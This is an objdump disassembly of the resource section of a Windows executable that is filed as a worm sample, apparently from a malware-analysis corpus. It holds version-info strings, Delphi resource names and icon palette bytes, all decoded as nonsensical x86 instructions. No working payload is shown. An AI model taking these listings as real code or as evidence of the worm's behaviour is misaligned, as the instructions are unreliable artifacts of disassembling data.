
malware_samples/worm/0e8863ad2062d5775d5955ab971f585674416d20e1b1570bf9b0effc8e63c3b9.exe:     file format pei-i386


Disassembly of section .rsrc:

0042e000 <.rsrc>:
	...
  42e00c:	01 00                	add    %eax,(%eax)
  42e00e:	04 00                	add    $0x0,%al
  42e010:	a8 01                	test   $0x1,%al
  42e012:	00 80 38 00 00 80    	add    %al,-0x7fffffc8(%eax)
  42e018:	03 00                	add    (%eax),%eax
  42e01a:	00 00                	add    %al,(%eax)
  42e01c:	78 00                	js     0x42e01e
  42e01e:	00 80 0a 00 00 00    	add    %al,0xa(%eax)
  42e024:	b8 00 00 80 0e       	mov    $0xe800000,%eax
  42e029:	00 00                	add    %al,(%eax)
  42e02b:	00 28                	add    %ch,(%eax)
  42e02d:	01 00                	add    %eax,(%eax)
  42e02f:	80 10 00             	adcb   $0x0,(%eax)
  42e032:	00 00                	add    %al,(%eax)
  42e034:	68 01 00 80 00       	push   $0x800001
  42e039:	00 00                	add    %al,(%eax)
  42e03b:	00 a2 7e 5a 35 00    	add    %ah,0x355a7e(%edx)
  42e041:	00 00                	add    %al,(%eax)
  42e043:	00 01                	add    %al,(%ecx)
  42e045:	00 00                	add    %al,(%eax)
  42e047:	00 b0 01 00 80 50    	add    %dh,0x50800001(%eax)
  42e04d:	00 00                	add    %al,(%eax)
  42e04f:	80 00 00             	addb   $0x0,(%eax)
  42e052:	00 00                	add    %al,(%eax)
  42e054:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e059:	00 00                	add    %al,(%eax)
  42e05b:	00 00                	add    %al,(%eax)
  42e05d:	00 01                	add    %al,(%ecx)
  42e05f:	00 00                	add    %al,(%eax)
  42e061:	00 00                	add    %al,(%eax)
  42e063:	00 68 00             	add    %ch,0x0(%eax)
  42e066:	00 00                	add    %al,(%eax)
  42e068:	f4                   	hlt
  42e069:	51                   	push   %ecx
  42e06a:	02 00                	add    (%eax),%al
  42e06c:	00 60 00             	add    %ah,0x0(%eax)
	...
  42e07b:	00 a2 7e 5a 35 00    	add    %ah,0x355a7e(%edx)
  42e081:	00 00                	add    %al,(%eax)
  42e083:	00 00                	add    %al,(%eax)
  42e085:	00 01                	add    %al,(%ecx)
  42e087:	00 01                	add    %al,(%ecx)
  42e089:	00 00                	add    %al,(%eax)
  42e08b:	00 90 00 00 80 00    	add    %dl,0x800000(%eax)
  42e091:	00 00                	add    %al,(%eax)
  42e093:	00 a2 7e 5a 35 00    	add    %ah,0x355a7e(%edx)
  42e099:	00 00                	add    %al,(%eax)
  42e09b:	00 00                	add    %al,(%eax)
  42e09d:	00 01                	add    %al,(%ecx)
  42e09f:	00 04 08             	add    %al,(%eax,%ecx,1)
  42e0a2:	00 00                	add    %al,(%eax)
  42e0a4:	a8 00                	test   $0x0,%al
  42e0a6:	00 00                	add    %al,(%eax)
  42e0a8:	7a e4                	jp     0x42e08e
  42e0aa:	02 00                	add    (%eax),%al
  42e0ac:	a8 0c                	test   $0xc,%al
	...
  42e0ba:	00 00                	add    %al,(%eax)
  42e0bc:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e0c1:	00 00                	add    %al,(%eax)
  42e0c3:	00 02                	add    %al,(%edx)
  42e0c5:	00 00                	add    %al,(%eax)
  42e0c7:	00 ba 01 00 80 d8    	add    %bh,-0x277fffff(%edx)
  42e0cd:	00 00                	add    %al,(%eax)
  42e0cf:	80 c8 01             	or     $0x1,%al
  42e0d2:	00 80 00 01 00 80    	add    %al,-0x7fffff00(%eax)
  42e0d8:	00 00                	add    %al,(%eax)
  42e0da:	00 00                	add    %al,(%eax)
  42e0dc:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e0e1:	00 00                	add    %al,(%eax)
  42e0e3:	00 00                	add    %al,(%eax)
  42e0e5:	00 01                	add    %al,(%ecx)
  42e0e7:	00 00                	add    %al,(%eax)
  42e0e9:	00 00                	add    %al,(%eax)
  42e0eb:	00 f0                	add    %dh,%al
  42e0ed:	00 00                	add    %al,(%eax)
  42e0ef:	00 9c be 02 00 10 00 	add    %bl,0x100002(%esi,%edi,4)
	...
  42e102:	00 00                	add    %al,(%eax)
  42e104:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e109:	00 00                	add    %al,(%eax)
  42e10b:	00 00                	add    %al,(%eax)
  42e10d:	00 01                	add    %al,(%ecx)
  42e10f:	00 00                	add    %al,(%eax)
  42e111:	00 00                	add    %al,(%eax)
  42e113:	00 18                	add    %bl,(%eax)
  42e115:	01 00                	add    %eax,(%eax)
  42e117:	00 ac be 02 00 f0 00 	add    %ch,0xf00002(%esi,%edi,4)
	...
  42e12a:	00 00                	add    %al,(%eax)
  42e12c:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e131:	00 00                	add    %al,(%eax)
  42e133:	00 01                	add    %al,(%ecx)
  42e135:	00 00                	add    %al,(%eax)
  42e137:	00 e0                	add    %ah,%al
  42e139:	01 00                	add    %eax,(%eax)
  42e13b:	80 40 01 00          	addb   $0x0,0x1(%eax)
  42e13f:	80 00 00             	addb   $0x0,(%eax)
  42e142:	00 00                	add    %al,(%eax)
  42e144:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e149:	00 00                	add    %al,(%eax)
  42e14b:	00 00                	add    %al,(%eax)
  42e14d:	00 01                	add    %al,(%ecx)
  42e14f:	00 04 08             	add    %al,(%eax,%ecx,1)
  42e152:	00 00                	add    %al,(%eax)
  42e154:	58                   	pop    %eax
  42e155:	01 00                	add    %eax,(%eax)
  42e157:	00 66 e4             	add    %ah,-0x1c(%esi)
  42e15a:	02 00                	add    (%eax),%al
  42e15c:	14 00                	adc    $0x0,%al
	...
  42e16a:	00 00                	add    %al,(%eax)
  42e16c:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e171:	00 00                	add    %al,(%eax)
  42e173:	00 00                	add    %al,(%eax)
  42e175:	00 01                	add    %al,(%ecx)
  42e177:	00 01                	add    %al,(%ecx)
  42e179:	00 00                	add    %al,(%eax)
  42e17b:	00 80 01 00 80 00    	add    %al,0x800001(%eax)
  42e181:	00 00                	add    %al,(%eax)
  42e183:	00 a2 7e 5a 35 00    	add    %ah,0x355a7e(%edx)
  42e189:	00 00                	add    %al,(%eax)
  42e18b:	00 00                	add    %al,(%eax)
  42e18d:	00 01                	add    %al,(%ecx)
  42e18f:	00 04 08             	add    %al,(%eax,%ecx,1)
  42e192:	00 00                	add    %al,(%eax)
  42e194:	98                   	cwtl
  42e195:	01 00                	add    %eax,(%eax)
  42e197:	00 f2                	add    %dh,%dl
  42e199:	e1 02                	loope  0x42e19d
  42e19b:	00 74 02 00          	add    %dh,0x0(%edx,%eax,1)
	...
  42e1a7:	00 03                	add    %al,(%ebx)
  42e1a9:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  42e1ad:	00 4c 00 04          	add    %cl,0x4(%eax,%eax,1)
  42e1b1:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  42e1b5:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  42e1b9:	00 06                	add    %al,(%esi)
  42e1bb:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  42e1bf:	00 43 00             	add    %al,0x0(%ebx)
  42e1c2:	4c                   	dec    %esp
  42e1c3:	00 41 00             	add    %al,0x0(%ecx)
  42e1c6:	4c                   	dec    %esp
  42e1c7:	00 0b                	add    %cl,(%ebx)
  42e1c9:	00 50 00             	add    %dl,0x0(%eax)
  42e1cc:	41                   	inc    %ecx
  42e1cd:	00 43 00             	add    %al,0x0(%ebx)
  42e1d0:	4b                   	dec    %ebx
  42e1d1:	00 41 00             	add    %al,0x0(%ecx)
  42e1d4:	47                   	inc    %edi
  42e1d5:	00 45 00             	add    %al,0x0(%ebp)
  42e1d8:	49                   	dec    %ecx
  42e1d9:	00 4e 00             	add    %cl,0x0(%esi)
  42e1dc:	46                   	inc    %esi
  42e1dd:	00 4f 00             	add    %cl,0x0(%edi)
  42e1e0:	08 00                	or     %al,(%eax)
  42e1e2:	4d                   	dec    %ebp
  42e1e3:	00 41 00             	add    %al,0x0(%ecx)
  42e1e6:	49                   	dec    %ecx
  42e1e7:	00 4e 00             	add    %cl,0x0(%esi)
  42e1ea:	49                   	dec    %ecx
  42e1eb:	00 43 00             	add    %al,0x0(%ebx)
  42e1ee:	4f                   	dec    %edi
  42e1ef:	00 4e 00             	add    %cl,0x0(%esi)
  42e1f2:	74 02                	je     0x42e1f6
  42e1f4:	34 00                	xor    $0x0,%al
  42e1f6:	00 00                	add    %al,(%eax)
  42e1f8:	56                   	push   %esi
  42e1f9:	00 53 00             	add    %dl,0x0(%ebx)
  42e1fc:	5f                   	pop    %edi
  42e1fd:	00 56 00             	add    %dl,0x0(%esi)
  42e200:	45                   	inc    %ebp
  42e201:	00 52 00             	add    %dl,0x0(%edx)
  42e204:	53                   	push   %ebx
  42e205:	00 49 00             	add    %cl,0x0(%ecx)
  42e208:	4f                   	dec    %edi
  42e209:	00 4e 00             	add    %cl,0x0(%esi)
  42e20c:	5f                   	pop    %edi
  42e20d:	00 49 00             	add    %cl,0x0(%ecx)
  42e210:	4e                   	dec    %esi
  42e211:	00 46 00             	add    %al,0x0(%esi)
  42e214:	4f                   	dec    %edi
  42e215:	00 00                	add    %al,(%eax)
  42e217:	00 00                	add    %al,(%eax)
  42e219:	00 bd 04 ef fe 00    	add    %bh,0xfeef04(%ebp)
  42e21f:	00 01                	add    %al,(%ecx)
  42e221:	00 00                	add    %al,(%eax)
  42e223:	00 01                	add    %al,(%ecx)
  42e225:	00 00                	add    %al,(%eax)
  42e227:	00 00                	add    %al,(%eax)
  42e229:	00 00                	add    %al,(%eax)
  42e22b:	00 01                	add    %al,(%ecx)
  42e22d:	00 00                	add    %al,(%eax)
  42e22f:	00 00                	add    %al,(%eax)
  42e231:	00 3f                	add    %bh,(%edi)
  42e233:	00 00                	add    %al,(%eax)
  42e235:	00 00                	add    %al,(%eax)
  42e237:	00 00                	add    %al,(%eax)
  42e239:	00 04 00             	add    %al,(%eax,%eax,1)
  42e23c:	00 00                	add    %al,(%eax)
  42e23e:	01 00                	add    %eax,(%eax)
	...
  42e24c:	00 00                	add    %al,(%eax)
  42e24e:	d2 01                	rolb   %cl,(%ecx)
  42e250:	00 00                	add    %al,(%eax)
  42e252:	00 00                	add    %al,(%eax)
  42e254:	53                   	push   %ebx
  42e255:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  42e259:	00 69 00             	add    %ch,0x0(%ecx)
  42e25c:	6e                   	outsb  %ds:(%esi),(%dx)
  42e25d:	00 67 00             	add    %ah,0x0(%edi)
  42e260:	46                   	inc    %esi
  42e261:	00 69 00             	add    %ch,0x0(%ecx)
  42e264:	6c                   	insb   (%dx),%es:(%edi)
  42e265:	00 65 00             	add    %ah,0x0(%ebp)
  42e268:	49                   	dec    %ecx
  42e269:	00 6e 00             	add    %ch,0x0(%esi)
  42e26c:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  42e270:	00 00                	add    %al,(%eax)
  42e272:	ae                   	scas   %es:(%edi),%al
  42e273:	01 00                	add    %eax,(%eax)
  42e275:	00 00                	add    %al,(%eax)
  42e277:	00 30                	add    %dh,(%eax)
  42e279:	00 38                	add    %bh,(%eax)
  42e27b:	00 30                	add    %dh,(%eax)
  42e27d:	00 34 00             	add    %dh,(%eax,%eax,1)
  42e280:	30 00                	xor    %al,(%eax)
  42e282:	33 00                	xor    (%eax),%eax
  42e284:	41                   	inc    %ecx
  42e285:	00 38                	add    %bh,(%eax)
  42e287:	00 00                	add    %al,(%eax)
  42e289:	00 22                	add    %ah,(%edx)
  42e28b:	00 01                	add    %al,(%ecx)
  42e28d:	00 01                	add    %al,(%ecx)
  42e28f:	00 43 00             	add    %al,0x0(%ebx)
  42e292:	6f                   	outsl  %ds:(%esi),(%dx)
  42e293:	00 6d 00             	add    %ch,0x0(%ebp)
  42e296:	70 00                	jo     0x42e298
  42e298:	61                   	popa
  42e299:	00 6e 00             	add    %ch,0x0(%esi)
  42e29c:	79 00                	jns    0x42e29e
  42e29e:	4e                   	dec    %esi
  42e29f:	00 61 00             	add    %ah,0x0(%ecx)
  42e2a2:	6d                   	insl   (%dx),%es:(%edi)
  42e2a3:	00 65 00             	add    %ah,0x0(%ebp)
	...
  42e2ae:	2a 00                	sub    (%eax),%al
  42e2b0:	01 00                	add    %eax,(%eax)
  42e2b2:	01 00                	add    %eax,(%eax)
  42e2b4:	46                   	inc    %esi
  42e2b5:	00 69 00             	add    %ch,0x0(%ecx)
  42e2b8:	6c                   	insb   (%dx),%es:(%edi)
  42e2b9:	00 65 00             	add    %ah,0x0(%ebp)
  42e2bc:	44                   	inc    %esp
  42e2bd:	00 65 00             	add    %ah,0x0(%ebp)
  42e2c0:	73 00                	jae    0x42e2c2
  42e2c2:	63 00                	arpl   %eax,(%eax)
  42e2c4:	72 00                	jb     0x42e2c6
  42e2c6:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  42e2cc:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
	...
  42e2da:	30 00                	xor    %al,(%eax)
  42e2dc:	08 00                	or     %al,(%eax)
  42e2de:	01 00                	add    %eax,(%eax)
  42e2e0:	46                   	inc    %esi
  42e2e1:	00 69 00             	add    %ch,0x0(%ecx)
  42e2e4:	6c                   	insb   (%dx),%es:(%edi)
  42e2e5:	00 65 00             	add    %ah,0x0(%ebp)
  42e2e8:	56                   	push   %esi
  42e2e9:	00 65 00             	add    %ah,0x0(%ebp)
  42e2ec:	72 00                	jb     0x42e2ee
  42e2ee:	73 00                	jae    0x42e2f0
  42e2f0:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  42e2f6:	00 00                	add    %al,(%eax)
  42e2f8:	00 00                	add    %al,(%eax)
  42e2fa:	31 00                	xor    %eax,(%eax)
  42e2fc:	2e 00 30             	add    %dh,%cs:(%eax)
  42e2ff:	00 2e                	add    %ch,(%esi)
  42e301:	00 30                	add    %dh,(%eax)
  42e303:	00 2e                	add    %ch,(%esi)
  42e305:	00 30                	add    %dh,(%eax)
  42e307:	00 00                	add    %al,(%eax)
  42e309:	00 22                	add    %ah,(%edx)
  42e30b:	00 01                	add    %al,(%ecx)
  42e30d:	00 01                	add    %al,(%ecx)
  42e30f:	00 49 00             	add    %cl,0x0(%ecx)
  42e312:	6e                   	outsb  %ds:(%esi),(%dx)
  42e313:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  42e317:	00 72 00             	add    %dh,0x0(%edx)
  42e31a:	6e                   	outsb  %ds:(%esi),(%dx)
  42e31b:	00 61 00             	add    %ah,0x0(%ecx)
  42e31e:	6c                   	insb   (%dx),%es:(%edi)
  42e31f:	00 4e 00             	add    %cl,0x0(%esi)
  42e322:	61                   	popa
  42e323:	00 6d 00             	add    %ch,0x0(%ebp)
  42e326:	65 00 00             	add    %al,%gs:(%eax)
  42e329:	00 00                	add    %al,(%eax)
  42e32b:	00 00                	add    %al,(%eax)
  42e32d:	00 26                	add    %ah,(%esi)
  42e32f:	00 01                	add    %al,(%ecx)
  42e331:	00 01                	add    %al,(%ecx)
  42e333:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  42e337:	00 67 00             	add    %ah,0x0(%edi)
  42e33a:	61                   	popa
  42e33b:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  42e33f:	00 6f 00             	add    %ch,0x0(%edi)
  42e342:	70 00                	jo     0x42e344
  42e344:	79 00                	jns    0x42e346
  42e346:	72 00                	jb     0x42e348
  42e348:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  42e34e:	74 00                	je     0x42e350
  42e350:	00 00                	add    %al,(%eax)
  42e352:	00 00                	add    %al,(%eax)
  42e354:	00 00                	add    %al,(%eax)
  42e356:	2a 00                	sub    (%eax),%al
  42e358:	01 00                	add    %eax,(%eax)
  42e35a:	01 00                	add    %eax,(%eax)
  42e35c:	4c                   	dec    %esp
  42e35d:	00 65 00             	add    %ah,0x0(%ebp)
  42e360:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  42e364:	6c                   	insb   (%dx),%es:(%edi)
  42e365:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  42e369:	00 61 00             	add    %ah,0x0(%ecx)
  42e36c:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  42e370:	6d                   	insl   (%dx),%es:(%edi)
  42e371:	00 61 00             	add    %ah,0x0(%ecx)
  42e374:	72 00                	jb     0x42e376
  42e376:	6b 00 73             	imul   $0x73,(%eax),%eax
	...
  42e381:	00 2a                	add    %ch,(%edx)
  42e383:	00 01                	add    %al,(%ecx)
  42e385:	00 01                	add    %al,(%ecx)
  42e387:	00 4f 00             	add    %cl,0x0(%edi)
  42e38a:	72 00                	jb     0x42e38c
  42e38c:	69 00 67 00 69 00    	imul   $0x690067,(%eax),%eax
  42e392:	6e                   	outsb  %ds:(%esi),(%dx)
  42e393:	00 61 00             	add    %ah,0x0(%ecx)
  42e396:	6c                   	insb   (%dx),%es:(%edi)
  42e397:	00 46 00             	add    %al,0x0(%esi)
  42e39a:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  42e3a0:	6e                   	outsb  %ds:(%esi),(%dx)
  42e3a1:	00 61 00             	add    %ah,0x0(%ecx)
  42e3a4:	6d                   	insl   (%dx),%es:(%edi)
  42e3a5:	00 65 00             	add    %ah,0x0(%ebp)
  42e3a8:	00 00                	add    %al,(%eax)
  42e3aa:	00 00                	add    %al,(%eax)
  42e3ac:	00 00                	add    %al,(%eax)
  42e3ae:	22 00                	and    (%eax),%al
  42e3b0:	01 00                	add    %eax,(%eax)
  42e3b2:	01 00                	add    %eax,(%eax)
  42e3b4:	50                   	push   %eax
  42e3b5:	00 72 00             	add    %dh,0x0(%edx)
  42e3b8:	6f                   	outsl  %ds:(%esi),(%dx)
  42e3b9:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  42e3bd:	00 63 00             	add    %ah,0x0(%ebx)
  42e3c0:	74 00                	je     0x42e3c2
  42e3c2:	4e                   	dec    %esi
  42e3c3:	00 61 00             	add    %ah,0x0(%ecx)
  42e3c6:	6d                   	insl   (%dx),%es:(%edi)
  42e3c7:	00 65 00             	add    %ah,0x0(%ebp)
	...
  42e3d2:	34 00                	xor    $0x0,%al
  42e3d4:	08 00                	or     %al,(%eax)
  42e3d6:	01 00                	add    %eax,(%eax)
  42e3d8:	50                   	push   %eax
  42e3d9:	00 72 00             	add    %dh,0x0(%edx)
  42e3dc:	6f                   	outsl  %ds:(%esi),(%dx)
  42e3dd:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  42e3e1:	00 63 00             	add    %ah,0x0(%ebx)
  42e3e4:	74 00                	je     0x42e3e6
  42e3e6:	56                   	push   %esi
  42e3e7:	00 65 00             	add    %ah,0x0(%ebp)
  42e3ea:	72 00                	jb     0x42e3ec
  42e3ec:	73 00                	jae    0x42e3ee
  42e3ee:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  42e3f4:	00 00                	add    %al,(%eax)
  42e3f6:	31 00                	xor    %eax,(%eax)
  42e3f8:	2e 00 30             	add    %dh,%cs:(%eax)
  42e3fb:	00 2e                	add    %ch,(%esi)
  42e3fd:	00 30                	add    %dh,(%eax)
  42e3ff:	00 2e                	add    %ch,(%esi)
  42e401:	00 30                	add    %dh,(%eax)
  42e403:	00 00                	add    %al,(%eax)
  42e405:	00 1a                	add    %bl,(%edx)
  42e407:	00 01                	add    %al,(%ecx)
  42e409:	00 01                	add    %al,(%ecx)
  42e40b:	00 43 00             	add    %al,0x0(%ebx)
  42e40e:	6f                   	outsl  %ds:(%esi),(%dx)
  42e40f:	00 6d 00             	add    %ch,0x0(%ebp)
  42e412:	6d                   	insl   (%dx),%es:(%edi)
  42e413:	00 65 00             	add    %ah,0x0(%ebp)
  42e416:	6e                   	outsb  %ds:(%esi),(%dx)
  42e417:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  42e41b:	00 00                	add    %al,(%eax)
  42e41d:	00 00                	add    %al,(%eax)
  42e41f:	00 00                	add    %al,(%eax)
  42e421:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  42e425:	00 00                	add    %al,(%eax)
  42e427:	00 56 00             	add    %dl,0x0(%esi)
  42e42a:	61                   	popa
  42e42b:	00 72 00             	add    %dh,0x0(%edx)
  42e42e:	46                   	inc    %esi
  42e42f:	00 69 00             	add    %ch,0x0(%ecx)
  42e432:	6c                   	insb   (%dx),%es:(%edi)
  42e433:	00 65 00             	add    %ah,0x0(%ebp)
  42e436:	49                   	dec    %ecx
  42e437:	00 6e 00             	add    %ch,0x0(%esi)
  42e43a:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  42e43e:	00 00                	add    %al,(%eax)
  42e440:	00 00                	add    %al,(%eax)
  42e442:	24 00                	and    $0x0,%al
  42e444:	04 00                	add    $0x0,%al
  42e446:	00 00                	add    %al,(%eax)
  42e448:	54                   	push   %esp
  42e449:	00 72 00             	add    %dh,0x0(%edx)
  42e44c:	61                   	popa
  42e44d:	00 6e 00             	add    %ch,0x0(%esi)
  42e450:	73 00                	jae    0x42e452
  42e452:	6c                   	insb   (%dx),%es:(%edi)
  42e453:	00 61 00             	add    %ah,0x0(%ecx)
  42e456:	74 00                	je     0x42e458
  42e458:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  42e45e:	00 00                	add    %al,(%eax)
  42e460:	00 00                	add    %al,(%eax)
  42e462:	04 08                	add    $0x8,%al
  42e464:	a8 03                	test   $0x3,%al
  42e466:	00 00                	add    %al,(%eax)
  42e468:	01 00                	add    %eax,(%eax)
  42e46a:	01 00                	add    %eax,(%eax)
  42e46c:	20 20                	and    %ah,(%eax)
  42e46e:	00 00                	add    %al,(%eax)
  42e470:	01 00                	add    %eax,(%eax)
  42e472:	18 00                	sbb    %al,(%eax)
  42e474:	a8 0c                	test   $0xc,%al
  42e476:	00 00                	add    %al,(%eax)
  42e478:	01 00                	add    %eax,(%eax)
  42e47a:	28 00                	sub    %al,(%eax)
  42e47c:	00 00                	add    %al,(%eax)
  42e47e:	20 00                	and    %al,(%eax)
  42e480:	00 00                	add    %al,(%eax)
  42e482:	40                   	inc    %eax
  42e483:	00 00                	add    %al,(%eax)
  42e485:	00 01                	add    %al,(%ecx)
  42e487:	00 08                	add    %cl,(%eax)
  42e489:	00 00                	add    %al,(%eax)
  42e48b:	00 00                	add    %al,(%eax)
  42e48d:	00 00                	add    %al,(%eax)
  42e48f:	04 00                	add    $0x0,%al
	...
  42e499:	00 00                	add    %al,(%eax)
  42e49b:	01 00                	add    %eax,(%eax)
  42e49d:	00 00                	add    %al,(%eax)
  42e49f:	01 00                	add    %eax,(%eax)
  42e4a1:	00 00                	add    %al,(%eax)
  42e4a3:	00 00                	add    %al,(%eax)
  42e4a5:	00 00                	add    %al,(%eax)
  42e4a7:	00 80 00 00 80 00    	add    %al,0x800000(%eax)
  42e4ad:	00 00                	add    %al,(%eax)
  42e4af:	80 80 00 80 00 00 00 	addb   $0x0,0x8000(%eax)
  42e4b6:	80 00 80             	addb   $0x80,(%eax)
  42e4b9:	00 80 80 00 00 c0    	add    %al,-0x3fffff80(%eax)
  42e4bf:	c0 c0 00             	rol    $0x0,%al
  42e4c2:	c0 dc c0             	rcr    $0xc0,%ah
  42e4c5:	00 f0                	add    %dh,%al
  42e4c7:	ca a6 00             	lret   $0xa6
  42e4ca:	04 04                	add    $0x4,%al
  42e4cc:	04 00                	add    $0x0,%al
  42e4ce:	08 08                	or     %cl,(%eax)
  42e4d0:	08 00                	or     %al,(%eax)
  42e4d2:	0c 0c                	or     $0xc,%al
  42e4d4:	0c 00                	or     $0x0,%al
  42e4d6:	11 11                	adc    %edx,(%ecx)
  42e4d8:	11 00                	adc    %eax,(%eax)
  42e4da:	16                   	push   %ss
  42e4db:	16                   	push   %ss
  42e4dc:	16                   	push   %ss
  42e4dd:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  42e4e0:	1c 00                	sbb    $0x0,%al
  42e4e2:	22 22                	and    (%edx),%ah
  42e4e4:	22 00                	and    (%eax),%al
  42e4e6:	29 29                	sub    %ebp,(%ecx)
  42e4e8:	29 00                	sub    %eax,(%eax)
  42e4ea:	55                   	push   %ebp
  42e4eb:	55                   	push   %ebp
  42e4ec:	55                   	push   %ebp
  42e4ed:	00 4d 4d             	add    %cl,0x4d(%ebp)
  42e4f0:	4d                   	dec    %ebp
  42e4f1:	00 42 42             	add    %al,0x42(%edx)
  42e4f4:	42                   	inc    %edx
  42e4f5:	00 39                	add    %bh,(%ecx)
  42e4f7:	39 39                	cmp    %edi,(%ecx)
  42e4f9:	00 80 7c ff 00 50    	add    %al,0x5000ff7c(%eax)
  42e4ff:	50                   	push   %eax
  42e500:	ff 00                	incl   (%eax)
  42e502:	93                   	xchg   %eax,%ebx
  42e503:	00 d6                	add    %dl,%dh
  42e505:	00 ff                	add    %bh,%bh
  42e507:	ec                   	in     (%dx),%al
  42e508:	cc                   	int3
  42e509:	00 c6                	add    %al,%dh
  42e50b:	d6                   	salc
  42e50c:	ef                   	out    %eax,(%dx)
  42e50d:	00 d6                	add    %dl,%dh
  42e50f:	e7 e7                	out    %eax,$0xe7
  42e511:	00 90 a9 ad 00 00    	add    %dl,0xada9(%eax)
  42e517:	00 33                	add    %dh,(%ebx)
  42e519:	00 00                	add    %al,(%eax)
  42e51b:	00 66 00             	add    %ah,0x0(%esi)
  42e51e:	00 00                	add    %al,(%eax)
  42e520:	99                   	cltd
  42e521:	00 00                	add    %al,(%eax)
  42e523:	00 cc                	add    %cl,%ah
  42e525:	00 00                	add    %al,(%eax)
  42e527:	33 00                	xor    (%eax),%eax
  42e529:	00 00                	add    %al,(%eax)
  42e52b:	33 33                	xor    (%ebx),%esi
  42e52d:	00 00                	add    %al,(%eax)
  42e52f:	33 66 00             	xor    0x0(%esi),%esp
  42e532:	00 33                	add    %dh,(%ebx)
  42e534:	99                   	cltd
  42e535:	00 00                	add    %al,(%eax)
  42e537:	33 cc                	xor    %esp,%ecx
  42e539:	00 00                	add    %al,(%eax)
  42e53b:	33 ff                	xor    %edi,%edi
  42e53d:	00 00                	add    %al,(%eax)
  42e53f:	66 00 00             	data16 add %al,(%eax)
  42e542:	00 66 33             	add    %ah,0x33(%esi)
  42e545:	00 00                	add    %al,(%eax)
  42e547:	66 66 00 00          	data16 data16 add %al,(%eax)
  42e54b:	66 99                	cwtd
  42e54d:	00 00                	add    %al,(%eax)
  42e54f:	66 cc                	data16 int3
  42e551:	00 00                	add    %al,(%eax)
  42e553:	66 ff 00             	incw   (%eax)
  42e556:	00 99 00 00 00 99    	add    %bl,-0x67000000(%ecx)
  42e55c:	33 00                	xor    (%eax),%eax
  42e55e:	00 99 66 00 00 99    	add    %bl,-0x66ffff9a(%ecx)
  42e564:	99                   	cltd
  42e565:	00 00                	add    %al,(%eax)
  42e567:	99                   	cltd
  42e568:	cc                   	int3
  42e569:	00 00                	add    %al,(%eax)
  42e56b:	99                   	cltd
  42e56c:	ff 00                	incl   (%eax)
  42e56e:	00 cc                	add    %cl,%ah
  42e570:	00 00                	add    %al,(%eax)
  42e572:	00 cc                	add    %cl,%ah
  42e574:	33 00                	xor    (%eax),%eax
  42e576:	00 cc                	add    %cl,%ah
  42e578:	66 00 00             	data16 add %al,(%eax)
  42e57b:	cc                   	int3
  42e57c:	99                   	cltd
  42e57d:	00 00                	add    %al,(%eax)
  42e57f:	cc                   	int3
  42e580:	cc                   	int3
  42e581:	00 00                	add    %al,(%eax)
  42e583:	cc                   	int3
  42e584:	ff 00                	incl   (%eax)
  42e586:	00 ff                	add    %bh,%bh
  42e588:	66 00 00             	data16 add %al,(%eax)
  42e58b:	ff 99 00 00 ff cc    	lcall  *-0x33010000(%ecx)
  42e591:	00 33                	add    %dh,(%ebx)
  42e593:	00 00                	add    %al,(%eax)
  42e595:	00 33                	add    %dh,(%ebx)
  42e597:	00 33                	add    %dh,(%ebx)
  42e599:	00 33                	add    %dh,(%ebx)
  42e59b:	00 66 00             	add    %ah,0x0(%esi)
  42e59e:	33 00                	xor    (%eax),%eax
  42e5a0:	99                   	cltd
  42e5a1:	00 33                	add    %dh,(%ebx)
  42e5a3:	00 cc                	add    %cl,%ah
  42e5a5:	00 33                	add    %dh,(%ebx)
  42e5a7:	00 ff                	add    %bh,%bh
  42e5a9:	00 33                	add    %dh,(%ebx)
  42e5ab:	33 00                	xor    (%eax),%eax
  42e5ad:	00 33                	add    %dh,(%ebx)
  42e5af:	33 33                	xor    (%ebx),%esi
  42e5b1:	00 33                	add    %dh,(%ebx)
  42e5b3:	33 66 00             	xor    0x0(%esi),%esp
  42e5b6:	33 33                	xor    (%ebx),%esi
  42e5b8:	99                   	cltd
  42e5b9:	00 33                	add    %dh,(%ebx)
  42e5bb:	33 cc                	xor    %esp,%ecx
  42e5bd:	00 33                	add    %dh,(%ebx)
  42e5bf:	33 ff                	xor    %edi,%edi
  42e5c1:	00 33                	add    %dh,(%ebx)
  42e5c3:	66 00 00             	data16 add %al,(%eax)
  42e5c6:	33 66 33             	xor    0x33(%esi),%esp
  42e5c9:	00 33                	add    %dh,(%ebx)
  42e5cb:	66 66 00 33          	data16 data16 add %dh,(%ebx)
  42e5cf:	66 99                	cwtd
  42e5d1:	00 33                	add    %dh,(%ebx)
  42e5d3:	66 cc                	data16 int3
  42e5d5:	00 33                	add    %dh,(%ebx)
  42e5d7:	66 ff 00             	incw   (%eax)
  42e5da:	33 99 00 00 33 99    	xor    -0x66cd0000(%ecx),%ebx
  42e5e0:	33 00                	xor    (%eax),%eax
